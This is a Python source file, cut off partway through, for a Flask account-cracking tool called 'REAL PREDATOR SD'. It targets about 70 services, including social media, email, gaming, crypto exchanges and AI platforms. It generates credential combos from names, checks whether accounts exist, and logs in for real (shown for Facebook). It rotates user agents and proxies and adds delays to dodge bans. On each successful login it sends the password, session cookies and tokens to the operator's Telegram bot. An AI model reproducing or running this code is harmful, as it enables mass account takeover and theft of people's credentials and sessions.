# ================================================================
# REAL PREDATOR SD v34.2 - ULTIMATE HUNTER (FIXED)
# Developer: ZERO STORE (Enhanced by @k_p_x1)
# Telegram: @MRDPY | WhatsApp: +249907118667
# ================================================================

import os, sys, re, time, random, threading, requests, json, secrets, urllib3, hashlib, base64, io
from datetime import datetime
from flask import Flask, render_template_string, jsonify, request, session, redirect, url_for, send_file
from flask_cors import CORS
from collections import defaultdict
from urllib.parse import urlparse, parse_qs

urllib3.disable_warnings()
app = Flask(__name__)
app.secret_key = secrets.token_hex(32)
CORS(app)

# ================================================================
# PASSWORD CONFIG
# ================================================================
ADMIN_PASSWORD = "ASHEU38HSBHXJHSGUE8UDHUD88EG8E8KDMKX9W00WHJDIU8UEHXBJZJ8WGEIJXKOXLXLXOSGUDYDI8EHD8HDIDIJDOSKDNZMZIXGEIEHJEGE8R8R9ROLRDGJ83IR8DIDGRIFF8"

# ================================================================
# PHONE CODES
# ================================================================
PHONE_CODES = [
    '+1','+7','+20','+27','+30','+31','+32','+33','+34','+36','+39','+40','+41','+43','+44','+45','+46','+47','+48','+49',
    '+51','+52','+53','+54','+55','+56','+57','+58','+60','+61','+62','+63','+64','+65','+66','+81','+82','+84','+86','+90',
    '+91','+92','+93','+94','+95','+98','+211','+212','+213','+216','+218','+220','+221','+222','+223','+224','+225','+226',
    '+227','+228','+229','+230','+231','+232','+233','+234','+235','+236','+237','+238','+239','+240','+241','+242','+243',
    '+244','+245','+246','+247','+248','+249','+250','+251','+252','+253','+254','+255','+256','+257','+258','+259','+260',
    '+261','+262','+263','+264','+265','+266','+267','+268','+269','+290','+291','+297','+298','+299','+350','+351','+352',
    '+353','+354','+355','+356','+357','+358','+359','+370','+371','+372','+373','+374','+375','+376','+377','+378','+379',
    '+380','+381','+382','+383','+385','+386','+387','+389','+420','+421','+423','+500','+501','+502','+503','+504','+505',
    '+506','+507','+508','+509','+590','+591','+592','+593','+594','+595','+596','+597','+598','+599','+670','+672','+673',
    '+674','+675','+676','+677','+678','+679','+680','+681','+682','+683','+685','+686','+687','+688','+689','+690','+691',
    '+692','+850','+852','+853','+855','+856','+880','+886','+960','+961','+962','+963','+964','+965','+966','+967','+968',
    '+970','+971','+972','+973','+974','+975','+976','+977','+992','+993','+994','+995','+996','+998'
]

# ================================================================
# PLATFORMS (70+)
# ================================================================
PLATFORMS = [
    {'name':'Facebook','icon':'fa-brands fa-facebook','color':'#1877f2','check':'facebook','gaming':False,'supports_phone':True,'ban_risk':'high'},
    {'name':'Instagram','icon':'fa-brands fa-instagram','color':'#e4405f','check':'instagram','gaming':False,'supports_phone':True,'ban_risk':'high'},
    {'name':'Twitter','icon':'fa-brands fa-twitter','color':'#1da1f2','check':'twitter','gaming':False,'supports_phone':True,'ban_risk':'high'},
    {'name':'TikTok','icon':'fa-brands fa-tiktok','color':'#00f2ea','check':'tiktok','gaming':False,'supports_phone':True,'ban_risk':'high'},
    {'name':'Snapchat','icon':'fa-brands fa-snapchat','color':'#fffc00','check':'snapchat','gaming':False,'supports_phone':True,'ban_risk':'high'},
    {'name':'WhatsApp','icon':'fa-brands fa-whatsapp','color':'#25D366','check':'whatsapp','gaming':False,'supports_phone':True,'ban_risk':'medium'},
    {'name':'Telegram','icon':'fa-brands fa-telegram','color':'#0088cc','check':'telegram','gaming':False,'supports_phone':True,'ban_risk':'medium'},
    {'name':'Signal','icon':'fa-solid fa-message','color':'#3A76F0','check':'signal','gaming':False,'supports_phone':True,'ban_risk':'low'},
    {'name':'WeChat','icon':'fa-brands fa-weixin','color':'#07C160','check':'wechat','gaming':False,'supports_phone':True,'ban_risk':'medium'},
    {'name':'Line','icon':'fa-brands fa-line','color':'#00C300','check':'line','gaming':False,'supports_phone':True,'ban_risk':'low'},
    {'name':'Viber','icon':'fa-solid fa-phone','color':'#7360F2','check':'viber','gaming':False,'supports_phone':True,'ban_risk':'low'},
    {'name':'Reddit','icon':'fa-brands fa-reddit','color':'#ff4500','check':'reddit','gaming':False,'supports_phone':False,'ban_risk':'medium'},
    {'name':'LinkedIn','icon':'fa-brands fa-linkedin','color':'#0a66c2','check':'linkedin','gaming':False,'supports_phone':False,'ban_risk':'medium'},
    {'name':'Pinterest','icon':'fa-brands fa-pinterest','color':'#BD081C','check':'pinterest','gaming':False,'supports_phone':False,'ban_risk':'low'},
    {'name':'Tumblr','icon':'fa-brands fa-tumblr','color':'#36465D','check':'tumblr','gaming':False,'supports_phone':False,'ban_risk':'low'},
    {'name':'Skype','icon':'fa-brands fa-skype','color':'#00AFF0','check':'skype','gaming':False,'supports_phone':False,'ban_risk':'low'},
    {'name':'Discord','icon':'fa-brands fa-discord','color':'#5865f2','check':'discord','gaming':True,'supports_phone':False,'ban_risk':'medium'},
    {'name':'Google','icon':'fa-brands fa-google','color':'#ea4335','check':'google','gaming':False,'supports_phone':True,'ban_risk':'low'},
    {'name':'Gmail','icon':'fa-brands fa-google','color':'#ea4335','check':'gmail','gaming':False,'supports_phone':False,'ban_risk':'low'},
    {'name':'Microsoft','icon':'fa-solid fa-envelope','color':'#0078D4','check':'microsoft','gaming':False,'supports_phone':False,'ban_risk':'low'},
    {'name':'Outlook','icon':'fa-solid fa-envelope','color':'#0078D4','check':'outlook','gaming':False,'supports_phone':False,'ban_risk':'low'},
    {'name':'Yahoo','icon':'fa-solid fa-envelope','color':'#7b0099','check':'yahoo','gaming':False,'supports_phone':False,'ban_risk':'low'},
    {'name':'ProtonMail','icon':'fa-solid fa-envelope','color':'#6D4AFF','check':'protonmail','gaming':False,'supports_phone':False,'ban_risk':'low'},
    {'name':'Mail.com','icon':'fa-solid fa-envelope','color':'#004080','check':'mailcom','gaming':False,'supports_phone':False,'ban_risk':'low'},
    {'name':'Yandex','icon':'fa-solid fa-envelope','color':'#FF0000','check':'yandex','gaming':False,'supports_phone':False,'ban_risk':'low'},
    {'name':'AOL','icon':'fa-solid fa-envelope','color':'#3D0080','check':'aol','gaming':False,'supports_phone':False,'ban_risk':'low'},
    {'name':'iCloud','icon':'fa-brands fa-apple','color':'#555555','check':'icloud','gaming':False,'supports_phone':False,'ban_risk':'low'},
    {'name':'Steam','icon':'fa-brands fa-steam','color':'#171a21','check':'steam','gaming':True,'supports_phone':False,'ban_risk':'medium'},
    {'name':'Twitch','icon':'fa-brands fa-twitch','color':'#9146ff','check':'twitch','gaming':True,'supports_phone':False,'ban_risk':'medium'},
    {'name':'Epic Games','icon':'fa-solid fa-gamepad','color':'#313131','check':'epic','gaming':True,'supports_phone':False,'ban_risk':'medium'},
    {'name':'Riot Games','icon':'fa-solid fa-gamepad','color':'#D3292F','check':'riot','gaming':True,'supports_phone':False,'ban_risk':'medium'},
    {'name':'PlayStation','icon':'fa-brands fa-playstation','color':'#003087','check':'playstation','gaming':True,'supports_phone':False,'ban_risk':'medium'},
    {'name':'Xbox','icon':'fa-brands fa-xbox','color':'#107C10','check':'xbox','gaming':True,'supports_phone':False,'ban_risk':'medium'},
    {'name':'Nintendo','icon':'fa-solid fa-gamepad','color':'#E60012','check':'nintendo','gaming':True,'supports_phone':False,'ban_risk':'medium'},
    {'name':'Ubisoft','icon':'fa-solid fa-gamepad','color':'#000000','check':'ubisoft','gaming':True,'supports_phone':False,'ban_risk':'medium'},
    {'name':'EA Sports','icon':'fa-solid fa-gamepad','color':'#FF0000','check':'ea','gaming':True,'supports_phone':False,'ban_risk':'medium'},
    {'name':'GOG','icon':'fa-solid fa-gamepad','color':'#86328A','check':'gog','gaming':True,'supports_phone':False,'ban_risk':'low'},
    {'name':'Battle.net','icon':'fa-solid fa-gamepad','color':'#00AEFF','check':'battlenet','gaming':True,'supports_phone':False,'ban_risk':'medium'},
    {'name':'Minecraft','icon':'fa-solid fa-cube','color':'#5A9C4E','check':'minecraft','gaming':True,'supports_phone':False,'ban_risk':'low'},
    {'name':'Roblox','icon':'fa-solid fa-cube','color':'#000000','check':'roblox','gaming':True,'supports_phone':False,'ban_risk':'medium'},
    {'name':'Valorant','icon':'fa-solid fa-crosshairs','color':'#FF4655','check':'valorant','gaming':True,'supports_phone':False,'ban_risk':'medium'},
    {'name':'Fortnite','icon':'fa-solid fa-skull','color':'#7B42BC','check':'fortnite','gaming':True,'supports_phone':False,'ban_risk':'medium'},
    {'name':'Apex Legends','icon':'fa-solid fa-shield','color':'#FF0000','check':'apex','gaming':True,'supports_phone':False,'ban_risk':'medium'},
    {'name':'Netflix','icon':'fa-solid fa-film','color':'#e50914','check':'netflix','gaming':False,'supports_phone':False,'ban_risk':'low'},
    {'name':'Spotify','icon':'fa-brands fa-spotify','color':'#1db954','check':'spotify','gaming':False,'supports_phone':False,'ban_risk':'low'},
    {'name':'Amazon Prime','icon':'fa-brands fa-amazon','color':'#ff9900','check':'amazon','gaming':False,'supports_phone':False,'ban_risk':'low'},
    {'name':'Hulu','icon':'fa-solid fa-tv','color':'#1CE783','check':'hulu','gaming':False,'supports_phone':False,'ban_risk':'low'},
    {'name':'Disney+','icon':'fa-solid fa-film','color':'#113CCF','check':'disney','gaming':False,'supports_phone':False,'ban_risk':'low'},
    {'name':'HBO Max','icon':'fa-solid fa-tv','color':'#5822B4','check':'hbomax','gaming':False,'supports_phone':False,'ban_risk':'low'},
    {'name':'YouTube','icon':'fa-brands fa-youtube','color':'#FF0000','check':'youtube','gaming':False,'supports_phone':False,'ban_risk':'low'},
    {'name':'Tinder','icon':'fa-solid fa-heart','color':'#FF6B6B','check':'tinder','gaming':False,'supports_phone':True,'ban_risk':'medium'},
    {'name':'Bumble','icon':'fa-solid fa-bee','color':'#FFC107','check':'bumble','gaming':False,'supports_phone':True,'ban_risk':'medium'},
    {'name':'Hinge','icon':'fa-solid fa-heart','color':'#6F4E37','check':'hinge','gaming':False,'supports_phone':True,'ban_risk':'medium'},
    {'name':'OKCupid','icon':'fa-solid fa-heart','color':'#FF6600','check':'okcupid','gaming':False,'supports_phone':False,'ban_risk':'low'},
    {'name':'Grindr','icon':'fa-solid fa-rainbow','color':'#FF4D4D','check':'grindr','gaming':False,'supports_phone':True,'ban_risk':'medium'},
    {'name':'Badoo','icon':'fa-solid fa-comment-dots','color':'#4A90D9','check':'badoo','gaming':False,'supports_phone':True,'ban_risk':'medium'},
    {'name':'ChatGPT','icon':'fa-solid fa-robot','color':'#10a37f','check':'chatgpt','gaming':False,'supports_phone':False,'ban_risk':'low'},
    {'name':'Claude','icon':'fa-solid fa-brain','color':'#7C3AED','check':'claude','gaming':False,'supports_phone':False,'ban_risk':'low'},
    {'name':'DeepSeek','icon':'fa-solid fa-microchip','color':'#00B4D8','check':'deepseek','gaming':False,'supports_phone':False,'ban_risk':'low'},
    {'name':'Perplexity','icon':'fa-solid fa-search','color':'#1A1A1A','check':'perplexity','gaming':False,'supports_phone':False,'ban_risk':'low'},
    {'name':'Gemini','icon':'fa-brands fa-google','color':'#4285F4','check':'gemini','gaming':False,'supports_phone':False,'ban_risk':'low'},
    {'name':'Copilot','icon':'fa-solid fa-code','color':'#00A4EF','check':'copilot','gaming':False,'supports_phone':False,'ban_risk':'low'},
    {'name':'Mistral','icon':'fa-solid fa-cloud','color':'#FF6B00','check':'mistral','gaming':False,'supports_phone':False,'ban_risk':'low'},
    {'name':'Hugging Face','icon':'fa-solid fa-hug','color':'#FFD21E','check':'huggingface','gaming':False,'supports_phone':False,'ban_risk':'low'},
    {'name':'Binance','icon':'fa-solid fa-coins','color':'#F0B90B','check':'binance','gaming':False,'supports_phone':False,'ban_risk':'low'},
    {'name':'Coinbase','icon':'fa-solid fa-coins','color':'#0052FF','check':'coinbase','gaming':False,'supports_phone':False,'ban_risk':'low'},
    {'name':'Kraken','icon':'fa-solid fa-coins','color':'#5848FF','check':'kraken','gaming':False,'supports_phone':False,'ban_risk':'low'},
    {'name':'Robinhood','icon':'fa-solid fa-chart-line','color':'#00C805','check':'robinhood','gaming':False,'supports_phone':False,'ban_risk':'low'},
    {'name':'GitHub','icon':'fa-brands fa-github','color':'#333','check':'github','gaming':False,'supports_phone':False,'ban_risk':'low'},
    {'name':'Apple','icon':'fa-brands fa-apple','color':'#555555','check':'apple','gaming':False,'supports_phone':True,'ban_risk':'low'},
    {'name':'Zoom','icon':'fa-solid fa-video','color':'#2D8CFF','check':'zoom','gaming':False,'supports_phone':False,'ban_risk':'low'},
    {'name':'PayPal','icon':'fa-brands fa-paypal','color':'#003087','check':'paypal','gaming':False,'supports_phone':False,'ban_risk':'low'},
    {'name':'Slack','icon':'fa-brands fa-slack','color':'#4A154B','check':'slack','gaming':False,'supports_phone':False,'ban_risk':'low'},
    {'name':'Telegram','icon':'fa-brands fa-telegram','color':'#0088cc','check':'telegram','gaming':False,'supports_phone':True,'ban_risk':'medium'},
]

# ================================================================
# GROUP SENDER SYSTEM (WITH FILE UPLOAD)
# ================================================================
class GroupSender:
    def __init__(self):
        self.telegram_bot_token = ""
        self.telegram_chat_id = ""
        self.whatsapp_group_id = ""
        self.discord_webhook = ""
        self.slack_webhook = ""
        self.enabled = False
        self.last_test_result = None
    
    def set_telegram(self, token, chat_id):
        self.telegram_bot_token = token
        self.telegram_chat_id = chat_id
        self.enabled = True
    
    def set_whatsapp(self, group_id):
        self.whatsapp_group_id = group_id
        self.enabled = True
    
    def set_discord(self, webhook):
        self.discord_webhook = webhook
        self.enabled = True
    
    def set_slack(self, webhook):
        self.slack_webhook = webhook
        self.enabled = True
    
    def test_telegram(self):
        if not self.telegram_bot_token or not self.telegram_chat_id:
            return {'success': False, 'error': 'Bot token or Chat ID not configured'}
        try:
            test_message = "🔔 *TEST MESSAGE*\n\n✅ Bot connection successful!\n📡 REAL PREDATOR SD v34.2\n⏰ " + datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            url = f"https://api.telegram.org/bot{self.telegram_bot_token}/sendMessage"
            data = {"chat_id": self.telegram_chat_id, "text": test_message, "parse_mode": "Markdown"}
            response = requests.post(url, data=data, timeout=15)
            if response.status_code == 200:
                result = response.json()
                if result.get('ok'):
                    self.last_test_result = 'success'
                    return {'success': True, 'message': 'Test message sent successfully!'}
            return {'success': False, 'error': 'Failed to send test message'}
        except Exception as e:
            return {'success': False, 'error': f'Connection error: {str(e)}'}

    def send_hit_with_files(self, platform, username, password, token, cookie, user_id):
        """إرسال رسالة صيد مع ملفات التوكن والكوكيز"""
        if not self.enabled or not self.telegram_bot_token or not self.telegram_chat_id:
            return False
        
        try:
            # ============================================================
            # 1. إنشاء رسالة جذابة
            # ============================================================
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            emoji_map = {
                'Facebook': '📘', 'Instagram': '📸', 'Twitter': '🐦', 'TikTok': '🎵',
                'Snapchat': '👻', 'WhatsApp': '💬', 'Telegram': '✈️', 'Google': '🔍',
                'Gmail': '📧', 'Microsoft': '🪟', 'Outlook': '📨', 'Yahoo': '📫',
                'Steam': '🎮', 'Twitch': '🟣', 'Epic Games': '⚔️', 'Discord': '💎',
                'Netflix': '🎬', 'Spotify': '🎵', 'YouTube': '▶️', 'GitHub': '🐙',
                'ChatGPT': '🤖', 'Binance': '💰', 'Coinbase': '🪙', 'PayPal': '💳'
            }
            emoji = emoji_map.get(platform, '🎯')
            
            # تحديد نوع المنصة
            platform_info = next((p for p in PLATFORMS if p['name'] == platform), None)
            is_gaming = platform_info.get('gaming', False) if platform_info else False
            
            # بناء الرسالة
            message = f"""
{emoji} *═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═*
{emoji} *🔥 REAL PREDATOR SD v34.2 - HIT DETECTED*
{emoji} *═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═*

{emoji} *PLATFORM:* `{platform}` { '🎮' if is_gaming else '' }
📧 *USERNAME:* `{username}`
🔑 *PASSWORD:* `{password}`
🆔 *USER ID:* `{user_id or 'N/A'}`
🕐 *TIME:* `{timestamp}`

{emoji} *═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═*
📁 *FILES ATTACHED:*
   📄 `token.txt` - Access Token
   📄 `cookie.txt` - Session Cookies
{emoji} *═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═*

💡 *COPY DATA:* Select any text above and copy
🔐 *SECURE:* Tokens and cookies are in attached files
"""
            
            # ============================================================
            # 2. إرسال الرسالة
            # ============================================================
            url = f"https://api.telegram.org/bot{self.telegram_bot_token}/sendMessage"
            data = {"chat_id": self.telegram_chat_id, "text": message, "parse_mode": "Markdown"}
            response = requests.post(url, data=data, timeout=15)
            
            if response.status_code != 200:
                return False
            
            # ============================================================
            # 3. إرسال ملف التوكن
            # ============================================================
            token_content = f"""====================================
REAL PREDATOR SD v34.2 - TOKEN
====================================
Platform: {platform}
Username: {username}
User ID: {user_id or 'N/A'}
Time: {timestamp}
====================================
TOKEN:
{token if token else 'N/A'}
====================================
"""
            token_file = io.BytesIO(token_content.encode('utf-8'))
            token_file.name = 'token.txt'
            
            files = {'document': (token_file.name, token_file, 'text/plain')}
            data = {'chat_id': self.telegram_chat_id}
            requests.post(
                f"https://api.telegram.org/bot{self.telegram_bot_token}/sendDocument",
                files=files,
                data=data,
                timeout=15
            )
            
            # ============================================================
            # 4. إرسال ملف الكوكيز
            # ============================================================
            cookie_content = f"""====================================
REAL PREDATOR SD v34.2 - COOKIES
====================================
Platform: {platform}
Username: {username}
User ID: {user_id or 'N/A'}
Time: {timestamp}
====================================
COOKIES:
{cookie if cookie else 'N/A'}
====================================
"""
            cookie_file = io.BytesIO(cookie_content.encode('utf-8'))
            cookie_file.name = 'cookie.txt'
            
            files = {'document': (cookie_file.name, cookie_file, 'text/plain')}
            data = {'chat_id': self.telegram_chat_id}
            requests.post(
                f"https://api.telegram.org/bot{self.telegram_bot_token}/sendDocument",
                files=files,
                data=data,
                timeout=15
            )
            
            return True
            
        except Exception as e:
            return False

# ================================================================
# ANTI-BAN SYSTEM
# ================================================================
class AntiBanSystem:
    def __init__(self):
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0',
            'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0'
        ]
        self.proxies = []
        self.lock = threading.Lock()
        self.attempt_count = defaultdict(int)
        self.last_attempt_time = defaultdict(float)
    
    def get_headers(self):
        return {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
        }
    
    def get_delay(self, platform_name):
        platform_info = next((p for p in PLATFORMS if p['name'] == platform_name), None)
        if platform_info and platform_info.get('ban_risk') == 'high':
            return random.uniform(60, 120)
        else:
            return random.uniform(5, 15)
    
    def can_attempt(self, platform_name):
        current_time = time.time()
        last_time = self.last_attempt_time.get(platform_name, 0)
        attempts = self.attempt_count.get(platform_name, 0)
        
        platform_info = next((p for p in PLATFORMS if p['name'] == platform_name), None)
        if platform_info and platform_info.get('ban_risk') == 'high':
            if current_time - last_time > 600:
                self.attempt_count[platform_name] = 0
                self.last_attempt_time[platform_name] = current_time
                return True
            elif attempts < 2:
                self.attempt_count[platform_name] += 1
                self.last_attempt_time[platform_name] = current_time
                return True
            else:
                return False
        else:
            if current_time - last_time > 300:
                self.attempt_count[platform_name] = 0
                self.last_attempt_time[platform_name] = current_time
                return True
            else:
                return False
    
    def add_proxy(self, proxy):
        with self.lock:
            if proxy not in self.proxies:
                self.proxies.append(proxy)
    
    def get_proxy(self):
        with self.lock:
            if not self.proxies:
                return None
            return random.choice(self.proxies)

# ================================================================
# ULTIMATE PREDATOR ENGINE
# ================================================================
class UltimatePredator:
    def __init__(self):
        self.anti_ban = AntiBanSystem()
        self.group_sender = GroupSender()
        self.running = False
        self.checked = 0
        self.hits = 0
        self.bad = 0
        self.feed = []
        self.results = []
        self.current_testing = []
        self.lock = threading.Lock()
        self.target_platform = None
        self.combos = []
        self.platform_stats = defaultdict(lambda: {'hits': 0, 'fails': 0, 'attempts': 0})
        self.real_checks = 0
        self.fake_checks = 0
        self.generation_mode = False
        self.generated_accounts = []
        self.names_list = []
        self.generation_active = False
        self.used_attempts = {}  # تتبع المحاولات لكل حساب
    
    def set_target_platform(self, platform_name):
        self.target_platform = platform_name if platform_name else None
    
    def set_names_list(self, names_text):
        """تحديد قائمة الأسماء مع توليد تنوع كبير"""
        with self.lock:
            raw_names = [n.strip() for n in names_text.split('\n') if n.strip()]
            self.names_list = []
            
            # توليد تنوع هائل من كل اسم
            suffixes = ['', '123', '2024', '2025', '99', '007', '000', '111', '222', '333', '444', '555', '666', '777', '888', '999']
            prefixes = ['', 'mr_', 'ms_', 'dr_', 'king_', 'queen_', 'big_', 'real_', 'official_', 'the_']
            domains = ['gmail.com', 'outlook.com', 'yahoo.com', 'hotmail.com', 'protonmail.com', 'mail.com', 'yandex.com', 'aol.com', 'icloud.com']
            
            for name in raw_names:
                base = re.sub(r'[^a-zA-Z0-9]', '', name.lower())
                if not base:
                    continue
                
                # توليد أسماء مستخدمين متنوعة
                username_variants = []
                for prefix in prefixes[:2]:
                    for suffix in suffixes[:5]:
                        username_variants.append(prefix + base + suffix)
                        username_variants.append(base + suffix)
                        username_variants.append(prefix + base)
                
                # توليد إيميلات
                email_variants = []
                for domain in domains[:5]:
                    for suffix in suffixes[:5]:
                        email_variants.append(base + suffix + '@' + domain)
                        email_variants.append(base + '_' + suffix + '@' + domain)
                
                # توليد كلمات مرور من الاسم
                passwords = []
                for p in prefixes[:3]:
                    for s in suffixes[:5]:
                        passwords.append(base + s)
                        passwords.append(base.capitalize() + s)
                        passwords.append(p + base + s)
                        passwords.append(base + '!' + s)
                        passwords.append(base + '@' + s)
                
                # إضافة كل التركيبات
                all_combos = []
                
                # 1. الإيميلات مع كلمات المرور
                for email in email_variants[:10]:
                    for pwd in passwords[:5]:
                        all_combos.append((email, pwd))
                        # المحاولة الثانية: اسم المستخدم (بدون @domain)
                        username_part = email.split('@')[0]
                        all_combos.append((username_part, pwd))
                
                # 2. الأسماء المستخدمة مع كلمات المرور
                for username in username_variants[:10]:
                    for pwd in passwords[:5]:
                        all_combos.append((username, pwd))
                
                # 3. أرقام هواتف وهمية (للتنوع)
                for _ in range(3):
                    phone = random.choice(PHONE_CODES) + ''.join([str(random.randint(0,9)) for _ in range(8,11)])
                    for pwd in passwords[:3]:
                        all_combos.append((phone, pwd))
                
                self.names_list.extend(all_combos[:20])  # 20 تركيبة لكل اسم
            
            self.generation_mode = True if self.names_list else False
            self.generated_accounts = self.names_list
    
    def add_combos(self, combo_list):
        with self.lock:
            self.combos.extend(combo_list)
            self.combos = list(dict.fromkeys(self.combos))
    
    def smart_hunt_with_tokens(self, username, password):
        """صيد ذكي مع محاولتين فقط لكل حساب"""
        results = []
        is_phone = bool(re.search(r'^[\+]?[0-9]{7,15}$', username.strip()))
        is_email = '@' in username
        is_username = not is_phone and not is_email
        
        # تحديد المنصات المستهدفة
        platforms_to_try = []
        if self.target_platform:
            platform = next((p for p in PLATFORMS if p['name'] == self.target_platform), None)
            if platform:
                platforms_to_try = [platform]
        else:
            # اختيار منصات متنوعة
            all_platforms = PLATFORMS.copy()
            random.shuffle(all_platforms)
            
            # تصفية حسب نوع المدخل
            if is_phone:
                filtered = [p for p in all_platforms if p.get('supports_phone', False)]
            elif is_email:
                filtered = [p for p in all_platforms if p.get('supports_phone', False) or True]  # كل المنصات
            else:
                filtered = all_platforms
            
            platforms_to_try = filtered[:8]  # 8 منصات لكل محاولة
        
        # ============================================================
        # المحاولة الأولى: نفس الإيميل/الرقم مع كلمة السر
        # ============================================================
        for platform in platforms_to_try[:4]:  # أول 4 منصات
            if not self.anti_ban.can_attempt(platform['name']):
                continue
            
            result = self._real_login_with_tokens(username, password, platform)
            if result:
                results.append(result)
                if result['status'] == 'hit':
                    self._handle_hit(result, platform, username, password)
                break
        
        # ============================================================
        # المحاولة الثانية: اسم المستخدم (بدون @domain) مع كلمة السر
        # ============================================================
        if is_email and not results:
            username_only = username.split('@')[0]
            for platform in platforms_to_try[4:8]:  # 4 منصات أخرى
                if not self.anti_ban.can_attempt(platform['name']):
                    continue
                
                result = self._real_login_with_tokens(username_only, password, platform)
                if result:
                    results.append(result)
                    if result['status'] == 'hit':
                        self._handle_hit(result, platform, username_only, password)
                    break
        
        return results
    
    def _handle_hit(self, result, platform, username, password):
        """معالجة النتيجة الناجحة مع إرسال الملفات"""
        with self.lock:
            self.hits += 1
            self.results.append(result)
            self.feed.append({
                'type': 'hit',
                'text': f"🎯 {platform['name']} | {username} | 🔑 {password} | 🎫 Token extracted",
                'time': datetime.now().strftime('%H:%M:%S')
            })
            self.current_testing = [{'username': username, 'platform': platform['name'], 'status': 'hit'}]
        
        # إرسال الرسالة مع الملفات
        self.group_sender.send_hit_with_files(
            platform=platform['name'],
            username=username,
            password=password,
            token=result.get('token', 'N/A'),
            cookie=result.get('cookie', 'N/A'),
            user_id=result.get('user_id', 'N/A')
        )
    
    def _real_login_with_tokens(self, username, password, platform):
        """تسجيل دخول حقيقي واستخراج التوكنات والكوكيز"""
        platform_name = platform['name']
        check_func = getattr(self, f'check_tokens_{platform["check"]}', None)
        if not check_func:
            return None
        
        try:
            session = requests.Session()
            session.verify = False
            session.headers.update(self.anti_ban.get_headers())
            
            proxy = self.anti_ban.get_proxy()
            if proxy:
                session.proxies = {"http": proxy, "https": proxy}
            
            # التحقق من وجود الحساب أولاً
            exists = self._verify_account_exists(username, platform)
            if not exists:
                with self.lock:
                    self.fake_checks += 1
                return None
            
            # محاولة تسجيل الدخول واستخراج التوكنات
            result = check_func(username, password, session)
            
            if result and result.get('success'):
                with self.lock:
                    self.platform_stats[platform_name]['hits'] += 1
                    self.real_checks += 1
                
                return {
                    'status': 'hit',
                    'platform': platform_name,
                    'username': username,
                    'password': password,
                    'token': result.get('token', 'N/A'),
                    'cookie': result.get('cookie', 'N/A'),
                    'user_id': result.get('user_id', 'N/A'),
                    'session_data': result.get('session_data', {})
                }
            else:
                with self.lock:
                    self.platform_stats[platform_name]['fails'] += 1
            
            # تأخير ذكي
            delay = self.anti_ban.get_delay(platform_name)
            time.sleep(delay)
            
        except Exception as e:
            pass
        
        return None
    
    def _verify_account_exists(self, username, platform):
        """التحقق من وجود الحساب بشكل حقيقي"""
        try:
            session = requests.Session()
            session.verify = False
            session.headers.update(self.anti_ban.get_headers())
            
            platform_name = platform['name'].lower()
            
            # Instagram
            if 'instagram' in platform_name:
                resp = session.get(f"https://www.instagram.com/{username}/", timeout=10)
                if 'Page Not Found' in resp.text or resp.status_code == 404:
                    return False
                if 'Sorry, this page isn\'t available' in resp.text:
                    return False
                return True
            
            # Facebook
            if 'facebook' in platform_name:
                resp = session.get(f"https://www.facebook.com/{username}", timeout=10)
                if 'Page Not Found' in resp.text or resp.status_code == 404:
                    return False
                return True
            
            # Twitter
            if 'twitter' in platform_name:
                resp = session.get(f"https://twitter.com/{username}", timeout=10)
                if 'This account doesn\'t exist' in resp.text or resp.status_code == 404:
                    return False
                return True
            
            # TikTok
            if 'tiktok' in platform_name:
                resp = session.get(f"https://www.tiktok.com/@{username}", timeout=10)
                if 'Couldn\'t find this account' in resp.text or resp.status_code == 404:
                    return False
                return True
            
            # Reddit
            if 'reddit' in platform_name:
                resp = session.get(f"https://www.reddit.com/user/{username}", timeout=10)
                if 'page not found' in resp.text.lower() or resp.status_code == 404:
                    return False
                return True
            
            # GitHub
            if 'github' in platform_name:
                resp = session.get(f"https://github.com/{username}", timeout=10)
                if 'Not Found' in resp.text or resp.status_code == 404:
                    return False
                return True
            
            return True
            
        except:
            return True

    # ================================================================
    # TOKEN CHECK FUNCTIONS - REAL LOGIN WITH TOKEN EXTRACTION
    # ================================================================

    def check_tokens_facebook(self, username, password, session):
        try:
            resp = session.get("https://www.facebook.com/login.php", timeout=10)
            lsd = re.search(r'name="lsd"[^>]*value="([^"]+)"', resp.text, re.I)
            if not lsd: return None
            data = {'email': username, 'pass': password, 'lsd': lsd.group(1), 'login': 'Log In'}
            login = session.post('https://www.facebook.com/login/', data=data, allow_redirects=True, timeout=10)
            
            if 'home.php' in login.url or 'facebook.com/?sk=welcome' in login.url:
                cookies = session.cookies.get_dict()
                cookie_str = '; '.join([f'{k}={v}' for k, v in cookies.items()])
                token = None
                if 'access_token' in login.text:
                    token_match = re.search(r'"access_token":"([^"]+)"', login.text, re.I)
                    if token_match:
                        token = token_match.group(1)
                user_id = None
                user_match = re.search(r'"userID":"([^"]+)"', login.text, re.I)
                if user_match:
                    user_id = user_match.group(1)
                return {
                    'success': True,
                    'token': token or 'N/A',
                    'cookie': cookie_str,
                    'user_id': user_id or 'N/A',
                    'session_data': {'cookies': cookies}
                }
            return None
        except: return None

    def check_tokens_instagram(self, username, password, session):
        try:
            resp = session.get("https://www.instagram.com/accounts/login/", timeout=10)
